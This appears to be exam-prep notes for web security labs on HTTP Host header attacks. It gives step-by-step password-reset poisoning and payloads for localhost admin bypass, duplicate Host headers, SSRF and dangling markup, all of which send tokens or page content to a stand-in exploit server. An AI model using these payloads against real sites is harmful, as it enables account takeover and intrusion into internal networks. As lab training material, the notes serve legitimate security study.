# HTTP Host Header Attacks - Stage 1

## 🎯 Target Location

**Primary Target:** Password Reset Functionality (`Forgot password?`)

## 🔍 How It Works

The application uses the `Host` header to generate password reset links. By poisoning the Host header, you can redirect the reset token to your exploit server.

## 🔥 Attack Flow

### Step 1: Identify Password Reset
Look for "Forgot password?" functionality

### Step 2: Intercept Reset Request
```http
POST /forgot-password HTTP/1.1
Host: vulnerable-site.com
Content-Type: application/x-www-form-urlencoded

username=victim
```

### Step 3: Poison Host Header
```http
POST /forgot-password HTTP/1.1
Host: exploit-server.com
Content-Type: application/x-www-form-urlencoded

username=victim
```

### Step 4: Check Exploit Server Logs
The victim will receive an email with a link like:
```
https://exploit-server.com/forgot-password?token=abc123xyz
```

When they click it, the token appears in your access logs.

### Step 5: Use Token
```http
GET /forgot-password?token=abc123xyz HTTP/1.1
Host: vulnerable-site.com
```

## 🛡️ Alternative Headers

If `Host` header doesn't work, try these:

```http
X-Forwarded-Host: exploit-server.com
X-Host: exploit-server.com
X-Forwarded-Server: exploit-server.com
```

## 📋 Lab Examples

### Lab 1: Password Reset Poisoning
**Scenario:** Send malicious email via Host header

**Payload:**
```http
POST /forgot-password HTTP/1.1
Host: exploit-server.com

username=carlos
```

---

### Lab 2: Admin Panel from Localhost Only
**Scenario:** Access admin panel restricted to localhost

**Payload:**
```http
GET /admin HTTP/1.1
Host: localhost
```

---

### Lab 3: Double Host Header
**Scenario:** Application uses first Host, cache uses second

**Payload:**
```http
GET / HTTP/1.1
Host: vulnerable-site.com
Host: exploit-server.com
```

---

### Lab 4: SSRF via Host Header
**Scenario:** Backend makes request based on Host header

**Payload:**
```http
GET / HTTP/1.1
Host: 192.168.0.1
```

---

### Lab 5: Routing-based SSRF
**Scenario:** Absolute URL with Host header mismatch

**Payload:**
```http
GET https://vulnerable-site.com/ HTTP/1.1
Host: 192.168.0.1
```

---

### Lab 6: Dangling Markup Injection
**Scenario:** Host header reflected in HTML without encoding

**Payload:**
```http
GET / HTTP/1.1
Host: vulnerable-site.com:'<a href="//exploit-server.com/?
```

This captures everything until the next quote in the HTML.

## 🎓 Exam Tips

1. **Always test password reset first** - Most common location
2. **Try all header variations** - `X-Forwarded-Host`, `X-Host`, etc.
3. **Check exploit server logs** - Tokens will appear there
4. **Test for localhost bypass** - Try `Host: localhost` for admin panels
5. **Combine with cache poisoning** - Host header + web cache = powerful attack

## 🔗 Testing Checklist

- [ ] Password reset functionality exists
- [ ] Intercept password reset request
- [ ] Modify Host header to exploit server
- [ ] Submit for victim user (usually `carlos`)
- [ ] Check exploit server access logs
- [ ] Extract password reset token
- [ ] Use token to reset victim's password

## 📚 References

- [PortSwigger HTTP Host Header Attacks](https://portswigger.net/web-security/host-header)
- [Host Header Attack Techniques](https://portswigger.net/web-security/host-header/exploiting)
